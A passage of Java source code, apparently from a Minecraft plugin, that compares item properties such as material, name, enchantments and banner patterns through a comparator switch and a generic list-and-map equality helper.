					&& comparate(item, ComparatorType.Name) && comparate(item, ComparatorType.Lores)
					&& comparate(item, ComparatorType.Enchantements) && comparate(item, ComparatorType.ItemsFlags)
					&& comparate(item, ComparatorType.Owner) && comparate(item, ComparatorType.BaseColor)
					&& comparate(item, ComparatorType.Patterns) && comparate(item, ComparatorType.StoredEnchantements);
		case ItemStack:
			return comparate(item, ComparatorType.Material) && comparate(item, ComparatorType.Amount)
					&& comparate(item, ComparatorType.Durability) && comparate(item, ComparatorType.Name)
					&& comparate(item, ComparatorType.Lores) && comparate(item, ComparatorType.Enchantements)
					&& comparate(item, ComparatorType.ItemsFlags) && comparate(item, ComparatorType.Owner)
					&& comparate(item, ComparatorType.BaseColor) && comparate(item, ComparatorType.Patterns)
					&& comparate(item, ComparatorType.StoredEnchantements);
		case Material:
			return getMaterial() == item.getMaterial();
		case Amount:
			return getAmount() == item.getAmount();
		case Durability:
			return getDurability() == item.getDurability();
		case Name:
			return getName() == item.getName();
		case Lores:
			return new comparaison<String, Object>().islistequal(getLores(), item.getLores());
		case Enchantements:
			return new comparaison<Enchantment, Integer>().ismapequal(getEnchantments(), item.getEnchantments());
		case ItemsFlags:
			return new comparaison<ItemFlag, Object>().islistequal(getItemFlags(), item.getItemFlags());
		case Owner:
			return getOwner() == item.getOwner();
		case BaseColor:
			return getBasecolor() == item.getBasecolor();
		case Patterns:
			return new comparaison<Pattern, Object>().islistequal(getPatterns(), item.getPatterns());
		case StoredEnchantements:
			return new comparaison<Enchantment, Integer>().ismapequal(getStoredEnchantments(),
					item.getStoredEnchantments());
		case Possesseur:
			return getPossesseur() == item.getPossesseur();
		case Creator_Name:
			return getCreator_name() == item.getCreator_name();
		case TAG:
			return new comparaison<String, Object>().islistequal(getTag(), item.getTag());
		default:
			return false;
		}
	}

	private class comparaison<type1, type2> {
		public comparaison() {

		}

		public Boolean islistequal(List<type1> list1, List<type1> list2) {
			if (list1 == null && list2 == null) {
				return true;
			} else if (list1 == null || list2 == null) {
				return false;
			} else if (list1.size() == list2.size()) {
				for (Integer i = 0; i < list1.size() && i < list2.size(); i++) {
					if (list1.get(i) != list2.get(i)) {
						return false;
					}
				}
				return true;
			} else {
				return false;
			}
		}

		public Boolean ismapequal(Map<type1, type2> map1, Map<type1, type2> map2) {
			if (map1 == null && map2 == null) {
				return true;
			} else if (map1 == null || map2 == null) {
				return false;
			} else if (map1.size() == map2.size()) {
				for (Entry<type1, type2> e : map1.entrySet()) {
					if (map2.get(e.getKey()) == null) {
						return false;
					}
					if (map2.get(e.getKey()) != e.getValue()) {
						return false;
					}
				}
				return true;
			} else {
				return false;
			}
		}
	}
}